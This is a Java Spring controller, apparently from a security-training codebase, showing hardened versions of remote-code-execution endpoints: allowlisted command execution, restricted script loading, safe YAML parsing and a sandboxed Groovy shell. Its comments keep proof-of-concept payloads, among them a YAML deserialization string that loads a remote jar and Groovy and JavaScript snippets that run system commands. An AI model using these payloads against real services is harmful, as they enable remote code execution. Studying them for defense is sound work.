package org.joychou.controller;

import groovy.lang.GroovyShell;
import lombok.extern.slf4j.Slf4j;
import org.codehaus.groovy.ast.expr.BinaryExpression;
import org.codehaus.groovy.ast.expr.ConstantExpression;
import org.codehaus.groovy.ast.expr.Expression;
import org.codehaus.groovy.ast.expr.UnaryMinusExpression;
import org.codehaus.groovy.ast.expr.UnaryPlusExpression;
import org.codehaus.groovy.ast.stmt.BlockStatement;
import org.codehaus.groovy.ast.stmt.ExpressionStatement;
import org.codehaus.groovy.ast.stmt.ReturnStatement;
import org.codehaus.groovy.ast.stmt.Statement;
import org.codehaus.groovy.control.CompilerConfiguration;
import org.codehaus.groovy.control.customizers.SecureASTCustomizer;
import org.codehaus.groovy.syntax.Types;
import org.joychou.security.SecurityUtil;
import org.joychou.util.WebUtils;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

import javax.script.Bindings;
import javax.script.ScriptContext;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.math.BigDecimal;
import java.sql.DriverManager;
import java.util.Arrays;
import java.util.Collections;
import java.util.regex.Pattern;


/**
 * Java code execute
 *
 * @author JoyChou @ 2018-05-24
 */
@Slf4j
@RestController
@RequestMapping("/rce")
public class Rce {

    private static final Pattern SAFE_URL_PATTERN = Pattern.compile("^https?://[a-zA-Z0-9._~:/?&=%#@+,;-]+$");

    @GetMapping("/runtime/exec")
    public String CommandExec(String cmd) {
        Runtime run = Runtime.getRuntime();
        StringBuilder sb = new StringBuilder();

        try {
            // Allowlisted executables/flags only, passed as argv (no shell, no free-form tokenizing).
            String[] argv = SecurityUtil.cmdAllowlist(cmd);
            if (argv == null) {
                return "Bad boy. I got u.";
            }
            Process p = run.exec(argv);
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }

            if (p.waitFor() != 0) {
                if (p.exitValue() == 1)
                    return "Command exec failed!!";
            }

            inBr.close();
            in.close();
        } catch (Exception e) {
            return e.toString();
        }
        return sb.toString();
    }


    /**
     * <a href="http://localhost:8080/rce/ProcessBuilder?cmd=whoami">POC</a>
     */
    @GetMapping("/ProcessBuilder")
    public String processBuilder(String cmd) {

        StringBuilder sb = new StringBuilder();

        try {
            // Allowlisted executables/flags only, passed as argv (no shell).
            String[] arrCmd = SecurityUtil.cmdAllowlist(cmd);
            if (arrCmd == null) {
                return "Bad boy. I got u.";
            }
            ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }
        } catch (Exception e) {
            return WebUtils.htmlEscape(e.toString());
        }

        return WebUtils.htmlEscape(sb.toString());
    }


    /**
     * http://localhost:8080/rce/jscmd?jsurl=http://xx.yy/zz.js
     *
     * curl http://xx.yy/zz.js
     * var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
     *
     * @param jsurl js url
     */
    @GetMapping("/jscmd")
    public void jsEngine(String jsurl) throws Exception{
        // js nashorn javascript ecmascript
        // Only load scripts from allowlisted http(s) domains (url_safe_domain.xml), and reject
        // any character that could break out of a plain URL.
        String safeUrl = SecurityUtil.checkURL(jsurl);
        if (safeUrl == null || !SAFE_URL_PATTERN.matcher(safeUrl).matches()) {
            throw new IllegalArgumentException("jsurl is not allowed");
        }
        ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
        // Pass the URL as a bound variable instead of concatenating it into script source.
        bindings.put("jsurl", safeUrl);
        engine.eval("load(jsurl)", bindings);
    }


    /**
     * http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]]
     * yaml-payload.jar: https://github.com/artsploit/yaml-payload
     *
     * @param content payloads
     */
    @GetMapping("/vuln/yarm")
    public void yarm(String content) {
        // SafeConstructor only builds standard YAML types; arbitrary class tags are rejected.
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    @GetMapping("/sec/yarm")
    public void secYarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    /**
     * http://localhost:8080/rce/groovy?content="open -a Calculator".execute()
     * @param content groovy shell
     */
    @GetMapping("groovy")
    public void groovyshell(String content) {
        // Sandbox: only plain arithmetic on numeric literals is accepted. No method calls,
        // property access, closures, imports, or non-numeric constants can be compiled.
        SecureASTCustomizer secure = new SecureASTCustomizer();
        secure.setClosuresAllowed(false);
        secure.setMethodDefinitionAllowed(false);
        secure.setImportsWhitelist(Collections.<String>emptyList());
        secure.setStarImportsWhitelist(Collections.<String>emptyList());
        secure.setStaticImportsWhitelist(Collections.<String>emptyList());
        secure.setStaticStarImportsWhitelist(Collections.<String>emptyList());
        secure.setIndirectImportCheckEnabled(true);
        secure.setPackageAllowed(false);
        secure.setAllowedStatements(Arrays.<Class<? extends Statement>>asList(
                BlockStatement.class, ExpressionStatement.class, ReturnStatement.class));
        secure.setAllowedExpressions(Arrays.<Class<? extends Expression>>asList(
                ConstantExpression.class, BinaryExpression.class,
                UnaryMinusExpression.class, UnaryPlusExpression.class));
        secure.setAllowedTokens(Arrays.asList(Types.PLUS, Types.MINUS, Types.MULTIPLY, Types.DIVIDE));
        secure.setAllowedConstantTypesClasses(Arrays.<Class>asList(
                Integer.class, Long.class, BigDecimal.class, Double.class,
                Integer.TYPE, Long.TYPE, Double.TYPE));
        secure.setAllowedReceiversClasses(Collections.<Class>emptyList());

        CompilerConfiguration config = new CompilerConfiguration();
        config.addCompilationCustomizers(secure);
        GroovyShell groovyShell = new GroovyShell(config);
        groovyShell.evaluate(content);
    }



    public static void main(String[] args) throws Exception{
        Runtime.getRuntime().exec("touch /tmp/x");
    }
}

